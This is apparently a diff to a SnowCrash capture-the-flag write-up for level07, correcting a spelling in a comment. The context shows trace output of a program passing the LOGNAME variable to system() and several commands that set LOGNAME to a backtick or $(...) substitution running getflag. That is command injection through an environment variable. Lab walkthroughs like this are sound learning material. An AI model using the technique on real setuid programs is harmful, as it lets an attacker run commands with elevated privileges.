@@ -34,7 +34,7 @@ system("/bin/echo level07 "level07
 <... system resumed> )                                                                                                                             = 0
 +++ exited (status 0) +++
 # Programs calls getenv() which searches the environment list to find the environment variable LOGNAME.
-# Change environment variable LOGNAME with command substition by escaping backticks if using with double quotes.
+# Change environment variable LOGNAME with command substitution by escaping backticks if using with double quotes.
 level07@SnowCrash:~$ export LOGNAME="\`getflag\`"
 #level07@SnowCrash:~$ export LOGNAME='`getflag`'
 #level07@SnowCrash:~$ export LOGNAME='$(getflag)'
